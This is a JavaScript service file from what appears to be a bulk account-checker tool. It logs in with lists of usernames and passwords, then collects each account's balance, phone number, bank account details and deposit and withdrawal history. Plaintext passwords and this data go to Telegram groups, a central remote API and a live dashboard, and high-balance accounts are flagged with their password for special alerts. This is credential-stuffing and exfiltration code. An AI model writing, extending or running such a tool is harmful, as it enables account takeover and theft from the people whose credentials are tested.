const path = require('path');
const config = require('../config');
const { loginById } = require('./loginService');
const { pushAccountChecked } = require('./accountCheckedService');
const { syncFlaggedAccount, syncCentralRun, syncCentralLoginResult  } = require('./vpsSyncService');

const {
  notifyDataGroup,
  notifyHighBalance,
  notifyRunSummary,
  flushAllBatches,
  waitForDataQueueDrain
} = require('./telegramService');

const {
  createImportRun,
  finishImportRun
} = require('../repositories/importRunRepository');

const {
  createLoginResult
} = require('../repositories/loginResultRepository');

const { ensureDir, writeJson } = require('../utils/file');
const { nowIsoCompact } = require('../utils/time');
const { mapWithConcurrency } = require('../utils/concurrency');

const {
  normalizeLoginResult,
  buildLoginResultPayload
} = require('../mappers/loginResultMapper');

const {
  buildTelegramResult
} = require('../mappers/telegramResultMapper');

const OUTPUT_DIR = path.resolve(process.cwd(), 'output');

function getSocket() {
  return global.io;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function safeNotify(fn, label) {
  try {
    await fn();
  } catch (err) {
    console.log(`[TELEGRAM ERROR] ${label} | ${err.message}`);
  }
}

function resolveRuntimeOptions(runtimeOptions = {}) {
  return {
    delayBetweenRequestsMs: Number(
      runtimeOptions.delayBetweenRequestsMs ??
        config.delayBetweenRequestsMs ??
        0
    ),
    highBalanceThreshold: Number(
      runtimeOptions.highBalanceThreshold ??
        config.highBalanceThreshold ??
        100000
    )
  };
}

async function processSingleAccount(
  account,
  runId,
  index,
  total,
  runtimeOptions = {}
) {
  const startedAt = Date.now();
  const resolvedOptions = resolveRuntimeOptions(runtimeOptions);

  console.log(`[${index + 1}/${total}] START ${account.username}`);

  let rawLogin;
  let normalized;

  try {
    rawLogin = await loginById({
      username: account.username,
      password: account.password
    });

    normalized = normalizeLoginResult(rawLogin, null);
  } catch (error) {
    normalized = normalizeLoginResult(null, error);
  }

  const status = normalized.ok ? 'SUCCESS' : 'FAILED';

  const record = await createLoginResult(
    buildLoginResultPayload(account, runId, status, normalized)
  );

  const result = buildTelegramResult(
    record,
    account,
    status,
    normalized
  );

  const durationMs = Date.now() - startedAt;

  console.log(
    `[${index + 1}/${total}] ${status} ${account.username} | balance=${normalized.balance} | ${durationMs}ms`
  );

  await safeNotify(
    () => notifyDataGroup(result, index + 1, total),
    `DATA_GROUP ${account.username}`
  );

  await pushAccountChecked({
    accountId: account._id,
    username: account.username,
    password: account.password,
    displayName: normalized.displayName,
    safe: normalized.safe,
    phone: normalized.phone,
    balance: normalized.balance,
    status,
    message: normalized.message
  });

  await syncCentralLoginResult({
    runKey: String(runId),
    toolName: config.toolName || 'bulk-tool-local',
    machineId: config.machineId || '',

    accountId: account._id,
    username: account.username,
    password: account.password,

    displayName: normalized.displayName,
    phone: normalized.phone,

    status,
    message: normalized.message,
    balance: normalized.balance,
    safe: normalized.safe,

    deposits: normalized.deposits || [],
    withdraws: normalized.withdraws || [],
    rawResponse: normalized.rawResponse,

    durationMs
  });

  /**
   * Sync account chú ý lên API VPS
   * Điều kiện: login success + có lịch sử nạp hoặc rút
   *
   * Lưu ý:
   * loginById cần return thêm:
   * - deposits: depositItems
   * - withdraws: withdrawItems
   */
  if (
    status === 'SUCCESS' &&
    (
      Number(normalized.depositCount || 0) > 0 ||
      Number(normalized.withdrawCount || 0) > 0
    )
  ) {
    try {
      console.log('[FLAGGED DEBUG]', {
        username: account.username,
        hasRawResponse: !!normalized.rawResponse,
        rawKeys: normalized.rawResponse ? Object.keys(normalized.rawResponse) : [],
        depositCount: normalized.depositCount,
        withdrawCount: normalized.withdrawCount,
        depositsLen: normalized.deposits?.length || 0,
        withdrawsLen: normalized.withdraws?.length || 0
      });

      await syncFlaggedAccount({
        accountId: account._id,
        username: account.username,
        password: account.password,
        displayName: normalized.displayName,
        phone: normalized.phone,
        balance: normalized.balance,
        safe: normalized.safe,

        depositCount: normalized.depositCount || 0,
        withdrawCount: normalized.withdrawCount || 0,

        deposits: normalized.deposits || [],
        withdraws: normalized.withdraws || [],

        lastDepositAmount: normalized.lastDepositAmount || 0,
        lastDepositStatus: normalized.lastDepositStatus || '',
        lastDepositBankName: normalized.lastDepositBankName || '',
        lastDepositBankAccount: normalized.lastDepositBankAccount || '',
        lastDepositNote: normalized.lastDepositNote || '',

        lastWithdrawAmount: normalized.lastWithdrawAmount || 0,
        lastWithdrawStatus: normalized.lastWithdrawStatus || '',
        lastWithdrawBankName: normalized.lastWithdrawBankName || '',
        lastWithdrawBankAccount: normalized.lastWithdrawBankAccount || '',
        lastWithdrawNote: normalized.lastWithdrawNote || '',
        rawResponse: normalized.rawResponse,

        source: config.runName || 'bulk-tool-local'
      });

      console.log(
        `[FLAGGED SYNC] ${account.username} | deposit=${normalized.depositCount || 0} | withdraw=${normalized.withdrawCount || 0}`
      );
    } catch (err) {
      console.log(`[FLAGGED ERROR] ${account.username} | ${err.message}`);
    }
  }

  const io = getSocket();

  if (io) {
    io.emit('run:result', {
      runId: String(runId),
      item: {
        _id: String(record._id),
        username: account.username,
        password: account.password || '',
        fullname: normalized.displayName || '',
        status,
        balance: normalized.balance,
        message: normalized.message || '',
        phone: normalized.phone || '',
        safe: normalized.safe || 0,
        transactionCount: normalized.transactionCount || 0,
        slipCount: normalized.slipCount || 0,
        depositCount: normalized.depositCount || 0,
        withdrawCount: normalized.withdrawCount || 0,
        rawResponse: normalized.rawResponse || null
      }
    });
  }

  const isHighBalance =
    status === 'SUCCESS' &&
    Number(normalized.balance || 0) > resolvedOptions.highBalanceThreshold;

  if (isHighBalance) {
    await safeNotify(
      () => notifyHighBalance(result, account.password),
      `HIGH_BALANCE ${account.username}`
    );
  }

  if (resolvedOptions.delayBetweenRequestsMs > 0) {
    await sleep(resolvedOptions.delayBetweenRequestsMs);
  }

  return {
    ...result,
    highBalance: isHighBalance
  };
}

async function runBulkLogin(accounts, source) {
  const startedAt = new Date();

  const run = await createImportRun({
    name: config.runName || `run-${nowIsoCompact()}`,
    sourceFile: source,
    startedAt,
    totalAccounts: accounts.length,
    threshold: config.highBalanceThreshold,
    notes: 'Bulk login run'
  });

  await syncCentralRun({
    runKey: String(run._id),
    toolName: config.toolName || 'bulk-tool-local',
    machineId: config.machineId || '',
    sourceFile: source,
    total: accounts.length,
    status: 'RUNNING',
    startedAt
  });

  const io = getSocket();

  if (io) {
    io.emit('run:started', {
      runId: String(run._id),
      runName: run.name,
      totalAccounts: accounts.length,
      startedAt: startedAt.toISOString()
    });
  }

  console.log(
    `[Run] Started ${run.name} | total=${accounts.length} | concurrency=${config.concurrency}`
  );

  const processed = await mapWithConcurrency(
    accounts,
    config.concurrency,
    (account, index) =>
      processSingleAccount(
        account,
        run._id,
        index,
        accounts.length,
        {
          delayBetweenRequestsMs: config.delayBetweenRequestsMs,
          highBalanceThreshold: config.highBalanceThreshold
        }
      )
  );

  const successCount = processed.filter((x) => x.status === 'SUCCESS').length;
  const failedCount = processed.filter((x) => x.status === 'FAILED').length;
  const highBalanceCount = processed.filter((x) => x.highBalance).length;

  const finishedAt = new Date();
  const durationMs = finishedAt - startedAt;

  const summary = {
    runId: String(run._id),
    runName: run.name,
    sourceFile: source,
    totalAccounts: accounts.length,
    successCount,
    failedCount,
    highBalanceCount,
    threshold: config.highBalanceThreshold,
    durationMs,
    startedAt: startedAt.toISOString(),
    finishedAt: finishedAt.toISOString()
  };

  await finishImportRun(run._id, {
    finishedAt,
    durationMs,
    successCount,
    failedCount,
    highBalanceCount,
    summary
  });

  await syncCentralRun({
    runKey: String(run._id),
    toolName: config.toolName || 'bulk-tool-local',
    machineId: config.machineId || '',
    sourceFile: source,
    total: accounts.length,
    status: 'DONE',
    finishedAt
  });

  ensureDir(OUTPUT_DIR);

  writeJson(
    path.join(OUTPUT_DIR, `run-summary-${nowIsoCompact()}.json`),
    { summary, processed }
  );

  if (io) {
    io.emit('run:summary', {
      runId: String(run._id),
      summary
    });
  }

  console.log('[Run] Flushing Telegram...');
  await flushAllBatches();

  console.log('[Run] Waiting queue...');
  await waitForDataQueueDrain();

  await safeNotify(() => notifyRunSummary(summary), 'RUN_SUMMARY');

  console.log(
    `[Run] Finished ${run.name} | success=${successCount} | failed=${failedCount}`
  );

  return { summary, processed };
}
 
module.exports = {
  runBulkLogin,
  processSingleAccount
};